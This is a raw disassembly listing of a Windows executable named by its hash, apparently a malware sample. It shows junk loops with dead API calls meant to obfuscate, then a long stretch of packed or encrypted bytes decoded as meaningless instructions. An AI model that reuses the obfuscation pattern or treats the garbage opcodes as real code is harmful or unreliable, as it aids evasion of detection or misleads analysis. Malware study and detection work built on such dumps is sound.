
8611ceb4c4cc463ff6ee8a784e428aeedb5a70db78f4d33a8030276106fae8c8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	or     DWORD PTR ds:0x42b01c,0x3e2a
  401013:	mov    eax,DWORD PTR [ebp+0x8]
  401016:	add    DWORD PTR ds:0x42b01c,edi
  40101c:	push   ebx
  40101d:	mov    DWORD PTR ds:0x42c000,0x10
  401027:	cmp    DWORD PTR ds:0x42c000,0x0
  40102e:	je     0x401068
  401034:	cmp    DWORD PTR ds:0x42c000,0x1d
  40103b:	jb     0x401068
  401041:	jmp    0x401056
  401046:	push   0x42a000
  40104b:	push   0x42f107
  401050:	call   DWORD PTR ds:0x43000b
  401056:	mov    ecx,DWORD PTR ds:0x42c000
  40105c:	dec    ecx
  40105d:	mov    DWORD PTR ds:0x42c000,ecx
  401063:	jmp    0x401027
  401068:	push   esi
  401069:	and    esi,DWORD PTR ds:0x42d004
  40106f:	push   edi
  401070:	and    ecx,edi
  401072:	mov    esi,0x75108a4
  401077:	sub    DWORD PTR ds:0x42c008,0x273e
  401081:	xor    eax,esi
  401083:	xor    edi,edi
  401085:	xor    edi,DWORD PTR ds:0x424af8
  40108b:	mov    ecx,DWORD PTR ds:0x424ae4
  401091:	sub    ecx,edi
  401093:	or     edi,DWORD PTR [edi+ecx*1]
  401096:	mov    edi,0x3272ec
  40109b:	mov    DWORD PTR ds:0x42900c,0x18d1
  4010a5:	add    eax,edi
  4010a7:	mov    DWORD PTR [ebp-0x40],eax
  4010aa:	and    DWORD PTR ds:0x42d01c,0x0
  4010b4:	xor    ecx,ecx
  4010b6:	add    ecx,DWORD PTR ds:0x42d01c
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42d01c,ecx
  4010c3:	cmp    DWORD PTR ds:0x42d01c,0x21
  4010ca:	jle    0x4010f0
  4010d0:	jmp    0x4010e3
  4010d5:	push   0x42b000
  4010da:	push   DWORD PTR [ebp-0x10]
  4010dd:	call   DWORD PTR ds:0x43000f
  4010e3:	cmp    DWORD PTR ds:0x42d01c,0x16
  4010ea:	jb     0x4010b4
  4010f0:	mov    eax,ds:0x42f1eb
  4010f5:	sbb    ecx,DWORD PTR ds:0x42b014
  4010fb:	mov    eax,DWORD PTR [eax]
  4010fd:	and    DWORD PTR ds:0x42d00c,ecx
  401103:	mov    DWORD PTR [ebp-0x3c],eax
  401106:	or     eax,eax
  401108:	mov    eax,ds:0x42f3f3
  40110d:	mov    eax,DWORD PTR [eax]
  40110f:	mov    DWORD PTR [ebp-0x1c],eax
  401112:	adc    ecx,0x40bd
  401118:	mov    DWORD PTR [ebp-0x34],0xf89c87b0
  40111f:	and    DWORD PTR ds:0x42a018,0x0
  401129:	mov    ecx,DWORD PTR ds:0x42a018
  40112f:	inc    ecx
  401130:	mov    DWORD PTR ds:0x42a018,ecx
  401136:	cmp    DWORD PTR ds:0x42a018,0x1a
  40113d:	jg     0x40115b
  401143:	jmp    0x40114e
  401148:	call   DWORD PTR ds:0x430013
  40114e:	cmp    DWORD PTR ds:0x42a018,0x12
  401155:	jb     0x401129
  40115b:	mov    eax,DWORD PTR [ebp-0x34]
  40115e:	xor    eax,esi
  401160:	and    DWORD PTR ds:0x42a014,0x0
  40116a:	jmp    0x40117c
  40116f:	mov    ecx,DWORD PTR ds:0x42a014
  401175:	inc    ecx
  401176:	mov    DWORD PTR ds:0x42a014,ecx
  40117c:	cmp    DWORD PTR ds:0x42a014,0x17
  401183:	jae    0x4011cd
  401189:	cmp    DWORD PTR ds:0x42a014,0x9
  401190:	jbe    0x4011cd
  401196:	jmp    0x4011ae
  40119b:	push   0x42f19b
  4011a0:	push   DWORD PTR [ebp-0x10]
  4011a3:	push   0x271c
  4011a8:	call   DWORD PTR ds:0x430017
  4011ae:	cmp    DWORD PTR ds:0x42a014,0x8
  4011b5:	jne    0x4011c8
  4011bb:	mov    ecx,DWORD PTR ds:0x42a014
  4011c1:	inc    ecx
  4011c2:	mov    DWORD PTR ds:0x42a014,ecx
  4011c8:	jmp    0x40116f
  4011cd:	add    eax,edi
  4011cf:	mov    DWORD PTR [ebp-0x40],eax
  4011d2:	and    DWORD PTR ds:0x42a01c,0x0
  4011dc:	mov    ecx,DWORD PTR ds:0x42a01c
  4011e2:	inc    ecx
  4011e3:	mov    DWORD PTR ds:0x42a01c,ecx
  4011e9:	cmp    DWORD PTR ds:0x42a01c,0x19
  4011f0:	jge    0x40122b
  4011f6:	jmp    0x40121e
  4011fb:	push   DWORD PTR [ebp-0x24]
  4011fe:	push   DWORD PTR [ebp-0x18]
  401201:	push   0x42d008
  401206:	push   0x305c
  40120b:	push   0x63b3
  401210:	push   DWORD PTR [ebp-0x10]
  401213:	push   0x1042
  401218:	call   DWORD PTR ds:0x43001b
  40121e:	cmp    DWORD PTR ds:0x42a01c,0x12
  401225:	jb     0x4011dc
  40122b:	mov    eax,ds:0x42f36b
  401230:	movzx  ecx,BYTE PTR ds:0x42c01c
  401237:	and    DWORD PTR ds:0x42d010,ecx
  40123d:	mov    DWORD PTR [ebp-0x40],eax
  401240:	not    eax
  401242:	mov    eax,DWORD PTR [ebp-0x3c]
  401245:	sub    DWORD PTR ds:0x42d018,0x42c018
  40124f:	mov    DWORD PTR [ebp-0x14],eax
  401252:	mov    DWORD PTR ds:0x42c014,0x1c
  40125c:	cmp    DWORD PTR ds:0x42c014,0x0
  401263:	je     0x401299
  401269:	cmp    DWORD PTR ds:0x42c014,0x28
  401270:	jbe    0x401299
  401276:	jmp    0x401289
  40127b:	push   DWORD PTR [ebp-0x1c]
  40127e:	push   0x72ae
  401283:	call   DWORD PTR ds:0x430027
  401289:	mov    eax,ds:0x42c014
  40128e:	dec    eax
  40128f:	mov    ds:0x42c014,eax
  401294:	jmp    0x40125c
  401299:	mov    eax,DWORD PTR [ebp-0x14]
  40129c:	mov    ecx,DWORD PTR ds:0x42d014
  4012a2:	sub    DWORD PTR ds:0x42d004,ecx
  4012a8:	push   0x4
  4012aa:	or     DWORD PTR ds:0x42c004,0xf09
  4012b4:	pop    ecx
  4012b5:	sub    ecx,eax
  4012b7:	mov    eax,ds:0x424b38
  4012bc:	mov    eax,DWORD PTR [eax]
  4012be:	sbb    DWORD PTR ds:0x42c000,eax
  4012c4:	add    ecx,DWORD PTR [ebp-0x1c]
  4012c7:	sub    eax,0x251f
  4012cc:	mov    DWORD PTR [ebp-0x2c],0xf89c85f0
  4012d3:	jmp    0x40362f
  4012d8:	sbb    al,0x11
  4012da:	ja     0x4012ad
  4012dc:	imul   ecx,DWORD PTR [ebx+0x45619388],0xc
  4012e3:	push   esi
  4012e4:	pusha  
  4012e5:	mov    ebx,DWORD PTR [ecx]
  4012e7:	aam    0x7a
  4012e9:	jp     0x401365
  4012eb:	jp     0x401328
  4012ed:	pop    edi
  4012ee:	jp     0x40136a
  4012f0:	and    eax,0x1931272c
  4012f5:	xor    eax,0x3a752f1b
  4012fa:	imul   esi,DWORD PTR [esi-0x67],0x6d6a6a74
  401301:	inc    edx
  401302:	aad    0xdc
  401304:	icebp  
  401305:	pusha  
  401306:	dec    eax
  401307:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  40130b:	jo     0x40137a
  40130d:	pop    ecx
  40130e:	iret   
  40130f:	pop    ebp
  401310:	dec    edx
  401311:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401318:	jg     0x401361
  40131a:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  401321:	push   DWORD PTR [esi-0x24]
  401324:	cli    
  401325:	arpl   WORD PTR [edi+0x1e],di
  401328:	in     eax,dx
  401329:	cmp    ebp,ecx
  40132b:	mov    edx,0xde2397ed
  401330:	mov    ebp,DWORD PTR [ecx]
  401332:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401339:	fst    QWORD PTR [esp+eiz*8]
  40133c:	push   cs
  40133d:	cli    
  40133e:	sbb    BYTE PTR ss:[eax+0xc],cl
  401342:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401347:	and    edx,DWORD PTR [ecx+0x15]
  40134a:	mov    dh,0xff
  40134c:	jmp    0x42c43e9a
  401351:	enter  0xf95b,0x1a
  401355:	cli    
  401356:	js     0x401309
  401358:	jae    0x401337
  40135a:	cwde   
  40135b:	pop    edi
  40135c:	mov    esi,DWORD PTR [ecx+0x41922417]
  401362:	add    ebx,DWORD PTR [esi+0xb83823c]
  401368:	fisubr DWORD PTR ds:0x43448d62
  40136e:	fs repz iret 
  401371:	mov    ch,BYTE PTR [ecx]
  401373:	mov    eax,eax
  401375:	(bad)  
  401376:	int3   
  401377:	mov    BYTE PTR [ecx-0xc],ah
  40137a:	push   ebp
  40137b:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  40137f:	add    eax,DWORD PTR [esi+0x13]
  401382:	lods   eax,DWORD PTR ds:[esi]
  401383:	dec    ebx
  401384:	retf   0x40b7
  401387:	rcl    BYTE PTR [esi+eiz*2],1
  40138a:	std    
  40138b:	bound  esp,QWORD PTR [esi-0x4b]
  40138e:	stc    
  40138f:	push   0x1352f8bf
  401394:	mov    esp,0x30ea0206
  401399:	and    ah,ah
  40139b:	mov    edx,0x51f3886
  4013a0:	sub    dl,cl
  4013a2:	xor    al,0x34
  4013a4:	repz adc BYTE PTR [ecx],0x71
  4013a8:	test   edi,edi
  4013aa:	js     0x4013a9
  4013ac:	es push 0x941d766c
  4013b2:	sub    edi,esp
  4013b4:	aam    0x45
  4013b6:	and    al,0x11
  4013b8:	lods   al,BYTE PTR ds:[esi]
  4013b9:	dec    esi
  4013ba:	stos   DWORD PTR es:[edi],eax
  4013bb:	in     eax,dx
  4013bc:	xchg   ebp,eax
  4013bd:	and    DWORD PTR [edi+0x4a53c7ff],esp
  4013c3:	xor    eax,ebp
  4013c5:	adc    DWORD PTR [edi+0x1f882d8c],eax
  4013cb:	call   DWORD PTR [edi]
  4013cd:	inc    eax
  4013ce:	mov    dl,0x49
  4013d0:	sub    al,bl
  4013d2:	cwde   
  4013d3:	pop    ebx
  4013d4:	inc    edx
  4013d5:	and    edi,DWORD PTR [ebp+ebx*2+0x2843b64f]
  4013dc:	push   ax
  4013de:	xchg   ecx,eax
  4013df:	pop    esi
  4013e0:	aaa    
  4013e1:	fcomp  st(4)
  4013e3:	jmp    0xad6ee849
  4013e8:	std    
  4013e9:	adc    eax,0xb87fdaa3
  4013ee:	xor    edi,DWORD PTR [ebp-0x331332df]
  4013f4:	dec    esp
  4013f5:	fdiv   QWORD PTR [ebp+esi*1+0x28]
  4013fa:	mov    cl,bl
  4013fc:	sar    BYTE PTR [ecx-0x7e],cl
  4013ff:	jae    0x40145c
  401401:	mov    esp,0x8482150d
  401406:	arpl   di,ax
  401408:	std    
  401409:	and    DWORD PTR [esi+0x11],edi
  40140c:	das    
  40140d:	test   bl,ah
  40140f:	push   edx
  401410:	mov    eax,0xaf1b9ad5
  401415:	adc    DWORD PTR [ecx],ecx
  401417:	pop    es
  401418:	sub    bh,BYTE PTR [eax-0x39d8f9e5]
  40141e:	std    
  40141f:	cmp    eax,0xfb9008a3
  401424:	adc    eax,0x2e3b5df3
  401429:	xor    eax,0x217286bb
  40142e:	inc    esp
  40142f:	clc    
  401430:	push   ds
  401431:	fwait
  401432:	shl    bl,1
  401434:	inc    ebx
  401435:	mov    eax,ecx
  401437:	mov    ah,0xd6
  401439:	dec    edx
  40143a:	enter  0x7ca2,0x92
  40143e:	ins    BYTE PTR es:[edi],dx
  40143f:	adc    DWORD PTR [edi+0x1277c343],edx
  401445:	ins    DWORD PTR es:[edi],dx
  401446:	dec    edx
  401447:	mov    fs,WORD PTR [esi]
  401449:	sar    BYTE PTR [ebp+0x1a],1
  40144c:	inc    ecx
  40144d:	push   ss
  40144e:	xor    BYTE PTR [edi],dh
  401450:	mov    ecx,0x3d4e3633
  401455:	mov    esp,0x653aa071
  40145a:	push   ds
  40145b:	sbb    ecx,0xe366abae
  401461:	shr    DWORD PTR [ebx+0x61],cl
  401464:	sub    bh,ah
  401466:	(bad)  
  401467:	js     0x40143b
  401469:	push   es
  40146a:	xchg   edi,eax
  40146b:	aaa    
  40146c:	daa    
  40146d:	dec    eax
  40146e:	sbb    cl,BYTE PTR [eax]
  401470:	test   eax,0x5f989955
  401475:	daa    
  401476:	stos   BYTE PTR es:[edi],al
  401477:	div    DWORD PTR [ebx]
  401479:	jg     0x4014c5
  40147b:	adc    esp,DWORD PTR [edi-0x12]
  40147e:	inc    esi
  40147f:	data16 das 
  401481:	sub    al,0x8f
  401483:	push   esp
  401484:	leave  
  401485:	cmp    bh,BYTE PTR [ebx-0x1908add4]
  40148b:	and    dh,dh
  40148d:	push   ebx
  40148e:	sub    esi,DWORD PTR [edx-0x44]
  401491:	shr    BYTE PTR [esi],1
  401493:	dec    ecx
  401494:	aad    0x82
  401496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401497:	mov    ebp,0x18e426e6
  40149c:	push   esi
  40149d:	sub    BYTE PTR [ebp-0xd],bh
  4014a0:	hlt    
  4014a1:	bound  ecx,QWORD PTR [ebp-0x59]
  4014a4:	push   eax
  4014a5:	aaa    
  4014a6:	fiadd  DWORD PTR [edx]
  4014a8:	das    
  4014a9:	and    BYTE PTR [ebx],dl
  4014ab:	sub    al,0x54
  4014ad:	test   DWORD PTR [esi-0x1e],ebp
  4014b0:	adc    esp,DWORD PTR [edi+0x63]
  4014b3:	stc    
  4014b4:	cld    
  4014b5:	mov    edi,0x1907eb83
  4014ba:	push   cs
  4014bb:	xchg   BYTE PTR [edi+0x66f215ef],al
  4014c1:	lods   eax,DWORD PTR ds:[esi]
  4014c2:	inc    eax
  4014c3:	or     edx,DWORD PTR [ecx]
  4014c5:	jns    0x40153d
  4014c7:	pusha  
  4014c8:	ds sub eax,0x56cb9478
  4014ce:	sub    eax,0x132424f
  4014d3:	push   eax
  4014d4:	(bad)  
  4014d5:	fisubr WORD PTR [ebp+0xd0fd52e]
  4014db:	aas    
  4014dc:	test   DWORD PTR [ecx],esi
  4014de:	cmp    BYTE PTR [eax+0x10a8f607],dl
  4014e4:	icebp  
  4014e5:	and    eax,0x965d3225
  4014ea:	jno    0x4014f2
  4014ec:	push   ebp
  4014ed:	mov    ecx,0xf0baf7f
  4014f2:	or     dh,dh
  4014f4:	or     DWORD PTR [edx+0x18],esp
  4014f7:	dec    ebp
  4014f8:	and    esp,ebp
  4014fa:	xor    DWORD PTR [edx],esi
  4014fc:	xchg   esp,eax
  4014fd:	dec    esi
  4014fe:	in     al,0x11
  401500:	sbb    ch,BYTE PTR [eax-0x2d356f92]
  401506:	or     al,0x42
  401508:	sbb    BYTE PTR [edx],al
  40150a:	pop    esp
  40150b:	mov    bl,0x55
  40150d:	sbb    al,0x77
  40150f:	and    ah,BYTE PTR [eax+0x25a697bd]
  401515:	lock dec ecx
  401517:	call   0xda5d75be
  40151c:	adc    bl,BYTE PTR ds:0x95ef8b6b
  401522:	outs   dx,BYTE PTR ds:[esi]
  401523:	push   es
  401524:	inc    esi
  401525:	push   ds
  401526:	ja     0x40152b
  401528:	fwait
  401529:	jp     0x401559
  40152b:	ret    
  40152c:	push   0xffffffc2
  40152e:	xchg   ebp,eax
  40152f:	inc    esp
  401530:	pop    ecx
  401531:	int    0x99
  401533:	mov    dh,0x5c
  401535:	mov    dl,0x26
  401537:	leave  
  401538:	mov    ecx,0x8047b9b1
  40153d:	rcl    BYTE PTR [edx+ebp*2-0x13ed217d],1
  401544:	mov    al,ds:0xc4ba2cf7
  401549:	cmp    dl,BYTE PTR [edi-0x70dfa6bd]
  40154f:	(bad)  
  401550:	adc    eax,0x9a252b58
  401555:	xor    BYTE PTR [edx],ch
  401557:	pop    esp
  401558:	lods   al,BYTE PTR ds:[esi]
  401559:	sub    BYTE PTR [edx],0x6a
  40155c:	in     eax,0x71
  40155e:	jne    0x40158a
  401560:	shl    BYTE PTR [esi-0x74ee5815],1
  401566:	pop    ecx
  401567:	mov    ecx,0x1d97e08c
  40156c:	xor    ebp,DWORD PTR [ebp+edx*8-0x7dd23608]
  401573:	jno    0x4015a7
  401575:	jge    0x4015c0
  401577:	pop    edi
  401578:	iret   
  401579:	fs mov dl,cl
  40157c:	sub    dl,BYTE PTR [edi+edx*8-0x4ad6eada]
  401583:	rcr    DWORD PTR [esi+ebx*2],cl
  401586:	mov    eax,ds:0xb4ec379d
  40158b:	retf   0x92dd
  40158e:	test   al,0x34
  401590:	jp     0x4015e7
  401592:	or     ebp,DWORD PTR [edi+ebp*2]
  401595:	inc    edi
  401596:	or     BYTE PTR [esi-0x2df58b1c],ch
  40159c:	ror    bl,cl
  40159e:	test   eax,0x46e363ab
  4015a3:	cs and eax,0xe2ed1cb7
  4015a9:	sbb    eax,0x4f563658
  4015ae:	mov    ch,0xc7
  4015b0:	inc    esp
  4015b1:	mov    edi,0xefbe895d
  4015b6:	sti    
  4015b7:	push   esi
  4015b8:	push   es
  4015b9:	in     eax,dx
  4015ba:	and    al,0x1b
  4015bc:	imul   eax,DWORD PTR [edx+0x576a663a],0xfffffff0
  4015c3:	mov    ecx,edi
  4015c5:	scas   eax,DWORD PTR es:[edi]
  4015c6:	ret    0x8024
  4015c9:	out    0x65,al
  4015cb:	aaa    
  4015cc:	int3   
  4015cd:	sbb    BYTE PTR [ebx],dl
  4015cf:	imul   esi,DWORD PTR ds:0x835e236b,0x383a8487
  4015d9:	mov    WORD PTR [eax+0x2b],ds
  4015dc:	je     0x4015ce
  4015de:	pop    DWORD PTR [ebp-0x280637e0]
  4015e4:	push   es
  4015e5:	sub    bl,bh
  4015e7:	mov    dl,0xef
  4015e9:	into   
  4015ea:	popf   
  4015eb:	sub    al,0x4a
  4015ed:	mov    ebx,0xb3378bf1
  4015f2:	(bad)  
  4015f3:	pop    ebp
  4015f4:	pop    esp
  4015f5:	cmc    
  4015f6:	cwde   
  4015f7:	inc    esp
  4015f8:	rcr    DWORD PTR [edi-0x5e7243bb],cl
  4015fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015ff:	or     eax,0x5a900623
  401604:	ja     0x4015ae
  401606:	mov    eax,ds:0xbc9dcd7
  40160b:	ins    DWORD PTR es:[edi],dx
  40160c:	sbb    BYTE PTR [ebx+0x7db4215d],al
  401612:	fs sti 
  401614:	(bad)  
  401615:	push   ss
  401616:	mov    dh,bl
  401618:	popa   
  401619:	in     al,dx
  40161a:	xchg   DWORD PTR [ebp+ecx*4-0x76],esp
  40161e:	(bad)  
  40161f:	in     eax,0xed
  401621:	cwde   
  401622:	bound  ecx,QWORD PTR [edi]
  401624:	sbb    eax,0xc5c0eead
  401629:	mov    ecx,0x5072ea3
  40162e:	inc    ebp
  40162f:	sub    dl,BYTE PTR [edx+0x365e0d1d]
  401635:	aaa    
  401636:	cmp    al,0x7c
  401638:	ret    
  401639:	jmp    0x4015c4
  40163b:	mov    ch,0x50
  40163d:	push   es
  40163e:	sbb    esi,DWORD PTR [ecx-0x70f19c6c]
  401644:	fcmovne st,st(2)
  401646:	sar    DWORD PTR [ebp+0x3],cl
  401649:	xor    eax,0xf93424b7
  40164e:	xlat   BYTE PTR ds:[ebx]
  40164f:	iret   
  401650:	or     esp,DWORD PTR [eax+0x115b274b]
  401656:	mov    esi,0x49d7040b
  40165b:	jmp    0x8b78648c
  401660:	mov    al,0xc7
  401662:	repz daa 
  401664:	mov    ds:0x8a82ce04,al
  401669:	mov    esi,0xd302e111
  40166e:	mov    BYTE PTR [esp+eax*4-0x34],ah
  401672:	sbb    eax,0x15ac7cd
  401677:	(bad)  
  401678:	shl    BYTE PTR [eax-0xfcf64d4],1
  40167e:	jp     0x4016b8
  401680:	scas   eax,DWORD PTR es:[edi]
  401681:	jg     0x401694
  401683:	fmul   QWORD PTR [ebp+0x38]
  401686:	dec    edx
  401687:	add    eax,0x8ac62e75
  40168c:	xchg   ebx,eax
  40168d:	gs aas 
  40168f:	(bad)  
  401690:	push   edi
  401691:	cwde   
  401692:	and    edi,edx
  401694:	in     eax,0xe3
  401696:	jmp    0x4016f9
  401698:	ret    0x19d6
  40169b:	mov    esi,0x82969a5a
  4016a0:	inc    esp
  4016a1:	dec    ecx
  4016a2:	in     al,0x32
  4016a4:	jp     0x4016ea
  4016a6:	or     edx,ebx
  4016a8:	call   0xc94d:0xa4830fe0
  4016af:	sbb    BYTE PTR [ecx+0x6b938abf],ch
  4016b5:	mov    eax,ds:0xbb76e132
  4016ba:	shl    DWORD PTR [edx+0x296e99f],1
  4016c0:	shl    dl,1
  4016c2:	popf   
  4016c3:	mov    ds:0x96b65629,al
  4016c8:	cld    
  4016c9:	popf   
  4016ca:	xor    BYTE PTR [ecx+0x347490ec],cl
  4016d0:	pop    ecx
  4016d1:	inc    esi
  4016d2:	push   esp
  4016d3:	dec    edi
  4016d4:	mov    ch,0x27
  4016d6:	cwde   
  4016d7:	push   es
  4016d8:	mov    WORD PTR [esp+edi*2-0x24],?
  4016dc:	or     al,0x3d
  4016de:	and    ebx,DWORD PTR [esi+ebp*4]
  4016e1:	(bad)  
  4016e2:	pop    ss
  4016e3:	mov    dl,0x1f
  4016e5:	lock or al,0xdc
  4016e8:	pop    ebp
  4016e9:	in     al,0xd9
  4016eb:	imul   esi,DWORD PTR [ecx+eiz*1-0x46],0xe4b2d4ac
  4016f3:	sbb    DWORD PTR [si+0x2752],0x4e
  4016f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016fa:	or     dh,BYTE PTR [ecx]
  4016fc:	data16 scas al,BYTE PTR es:[edi]
  4016fe:	aam    0x1
  401700:	(bad)  
  401701:	ficom  DWORD PTR [eax]
  401703:	call   0xec57:0x1cbedb79
  40170a:	add    al,0xfb
  40170c:	sbb    bl,al
  40170e:	xlat   BYTE PTR ds:[ebx]
  40170f:	cmc    
  401710:	lock fs pop esp
  401713:	jae    0x4016f0
  401715:	adc    eax,0xb767ca14
  40171a:	outs   dx,DWORD PTR ds:[esi]
  40171b:	outs   dx,BYTE PTR ds:[esi]
  40171c:	scas   eax,DWORD PTR es:[edi]
  40171d:	sub    eax,0xecc725ac
  401722:	enter  0x9db2,0x4c
  401726:	shr    BYTE PTR [edi+0xa833619],0x51
  40172d:	push   0x2b
  40172f:	in     al,0xbc
  401731:	inc    edi
  401732:	int3   
  401733:	outs   dx,DWORD PTR ds:[esi]
  401734:	inc    edx
  401735:	ftst   
  401737:	push   0xffffffe0
  401739:	mov    al,0x35
  40173b:	push   cs
  40173c:	mov    ebx,gs
  40173e:	ja     0x401760
  401740:	xchg   ebx,eax
  401741:	out    0xa3,eax
  401743:	rcl    DWORD PTR [eax],cl
  401745:	adc    al,0xe3
  401747:	(bad)  
  401749:	mov    ebx,0x18a19286
  40174e:	or     ch,BYTE PTR [ecx-0x55]
  401751:	dec    esi
  401752:	bound  esp,QWORD PTR [edi]
  401754:	aaa    
  401755:	test   al,0x26
  401757:	imul   ebp,DWORD PTR [eax+0x2f48dbc3],0x61
  40175e:	pop    ebp
  40175f:	dec    eax
  401760:	out    0xc1,eax
  401762:	shl    eax,1
  401764:	je     0x401714
  401766:	dec    ebp
  401767:	jecxz  0x40170d
  401769:	xor    DWORD PTR [ecx-0x418fb83f],0xf016c8a9
  401773:	sub    bl,BYTE PTR [esi]
  401775:	xor    bh,dl
  401777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401778:	pcmpeqb mm3,QWORD PTR [ebx-0x37c272d4]
  40177f:	not    dl
  401781:	gs push edx
  401783:	add    eax,0xf09f54c6
  401788:	mov    WORD PTR [ecx],fs
  40178a:	jae    0x4017bc
  40178c:	jne    0x401748
  40178e:	and    BYTE PTR [ebx+0x48],cl
  401791:	inc    edi
  401792:	jmp    0xdc4ca5ce
  401797:	sub    eax,0xe41d87f6
  40179c:	mov    dl,0xc4
  40179e:	ja     0x4017a3
  4017a0:	stos   DWORD PTR es:[edi],eax
  4017a1:	or     eax,0xf716c028
  4017a6:	iret   
  4017a7:	inc    eax
  4017a8:	repz call 0xb7b2:0x15e40ad9
  4017b0:	jg     0x401777
  4017b2:	sub    bh,bl
  4017b4:	js     0x4017e2
  4017b6:	out    0xee,al
  4017b8:	loop   0x401821
  4017ba:	pop    esi
  4017bb:	stos   DWORD PTR es:[edi],eax
  4017bc:	nop
  4017bd:	cmp    BYTE PTR [eax+0x32e5d3c4],0x70
  4017c4:	and    eax,0x7b02e7f4
  4017c9:	push   edi
  4017ca:	in     eax,0x26
  4017cc:	cdq    
  4017cd:	add    eax,DWORD PTR [ecx-0x3a]
  4017d0:	pop    ecx
  4017d1:	lahf   
  4017d2:	sbb    bl,BYTE PTR [esi+0x44ea55f9]
  4017d8:	pop    esi
  4017d9:	jg     0x4017a6
  4017db:	pop    ecx
  4017dc:	fiadd  DWORD PTR [eax+0x37d865be]
  4017e2:	popf   
  4017e3:	or     eax,0xe27f152d
  4017e8:	imul   ebp,DWORD PTR ds:0x46860ca7,0xb6d0a8d
  4017f2:	sbb    al,0xe2
  4017f4:	pop    esi
  4017f5:	loopne 0x4017e2
  4017f7:	dec    esp
  4017f8:	push   edi
  4017f9:	nop
  4017fa:	jo     0x401795
  4017fc:	and    BYTE PTR [esi+0x2],ah
  4017ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401800:	imul   ebx,DWORD PTR [ebp+0x1689a4f],0xdda34e03
  40180a:	scas   eax,DWORD PTR es:[edi]
  40180b:	jb     0x401799
  40180d:	sub    al,0x5
  40180f:	ins    DWORD PTR es:[edi],dx
  401810:	push   0xffffffdd
  401812:	jl     0x4017ad
  401814:	pop    esi
  401815:	test   eax,0x900a9375
  40181a:	clc    
  40181b:	push   ds
  40181c:	push   edx
  40181d:	adc    DWORD PTR [ebx+0x73ed5054],esi
  401823:	mov    bl,0x43
  401825:	test   eax,0x2f70d77b
  40182a:	outs   dx,BYTE PTR ds:[esi]
  40182b:	test   ecx,ebp
  40182d:	cld    
  40182e:	retf   0xafa6
  401831:	outs   dx,DWORD PTR ds:[esi]
  401832:	add    BYTE PTR [esi+0x65eb15cf],ch
  401838:	sbb    eax,0xdde8857b
  40183d:	jle    0x4017c8
  40183f:	pop    edx
  401840:	aam    0x69
  401842:	js     0x40183a
  401844:	pop    ecx
  401845:	push   ecx
  401846:	test   DWORD PTR [edi+ebx*2+0x229dd74f],edx
  40184d:	dec    edx
  40184e:	mov    cl,0xad
  401850:	(bad)  
  401851:	out    0x4c,al
  401853:	sub    eax,0xc8b894a4
  401858:	inc    ebx
  401859:	cli    
  40185a:	(bad)  
  40185b:	enter  0x7840,0x15
  40185f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401860:	and    DWORD PTR [ebp+0x58],edi
  401863:	or     DWORD PTR es:[eax-0x7a5b490f],0xffffff8c
  40186b:	pop    ebx
  40186c:	dec    edi
  40186d:	mov    esi,0x2c060369
  401872:	jns    0x4018d9
  401874:	pop    ebx
  401875:	aam    0xad
  401877:	or     al,0xe8
  401879:	iret   
  40187a:	sub    ah,cl
  40187c:	sbb    cl,BYTE PTR [ecx+edx*1+0x7964464d]
  401883:	inc    ebx
  401884:	xchg   esi,eax
  401885:	cdq    
  401886:	ficom  DWORD PTR gs:[ebp-0x7b7d48a0]
  40188d:	push   ss
  40188e:	aaa    
  40188f:	test   DWORD PTR [edi+0x15005a30],0x252e0367
  401899:	aaa    
  40189a:	dec    edi
  40189b:	addr16 int3 
  40189d:	jns    0x4018b3
  40189f:	cmc    
  4018a0:	loopne 0x4018d6
  4018a2:	aam    0xd0
  4018a4:	cs pop edi
  4018a6:	cs daa 
  4018a8:	push   ebp
  4018a9:	sbb    BYTE PTR [edi-0x2866866d],0x1c
  4018b0:	movq   QWORD PTR [ebp-0x76],mm3
  4018b4:	sbb    ecx,DWORD PTR [esi]
  4018b6:	test   edi,esi
  4018b8:	popf   
  4018b9:	bound  ebx,QWORD PTR [edx+0x2e75769c]
  4018bf:	cli    
  4018c0:	mov    DWORD PTR [edx],esp
  4018c2:	jmp    0x68ae:0x5e8fdf65
  4018c9:	das    
  4018ca:	lds    ebx,FWORD PTR [edi+ebx*2+0x6d]
  4018ce:	loope  0x40189d
  4018d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d1:	dec    ebx
  4018d2:	jl     0x4018b2
  4018d4:	leave  
  4018d5:	and    DWORD PTR [edx+eax*8+0x17],esi
  4018d9:	xor    ch,0xdc
  4018dc:	xor    DWORD PTR [edi],ebx
  4018de:	jnp    0x401953
  4018e0:	jno    0x4018a4
  4018e2:	mov    eax,0x6f1d65ab
  4018e7:	inc    ebx
  4018e8:	sbb    ebp,DWORD PTR ss:[ecx-0x6310df91]
  4018ef:	mov    esp,0xd42961b5
  4018f4:	icebp  
  4018f5:	and    DWORD PTR [edx-0x4e],ebp
  4018f8:	outs   dx,DWORD PTR ds:[esi]
  4018f9:	les    edx,FWORD PTR [ecx]
  4018fb:	hlt    
  4018fc:	mov    al,ds:0x338c5797
  401901:	shr    DWORD PTR [esi],0x24
  401904:	das    
  401905:	inc    edx
  401906:	sbb    dl,BYTE PTR [ecx]
  401908:	popf   
  401909:	jb     0x4018d2
  40190b:	rcr    BYTE PTR [edi+eax*1-0x4a],1
  40190f:	les    eax,FWORD PTR [ebp+ecx*8-0x72]
  401913:	hlt    
  401914:	imul   eax,DWORD PTR [edi],0xd1f4815e
  40191a:	add    ah,0x76
  40191d:	mov    bl,0x6a
  40191f:	mov    DWORD PTR ds:0xc6e6722a,edi
  401925:	aad    0x41
  401927:	pop    edi
  401928:	mov    ah,0xbc
  40192a:	ja     0x4018f7
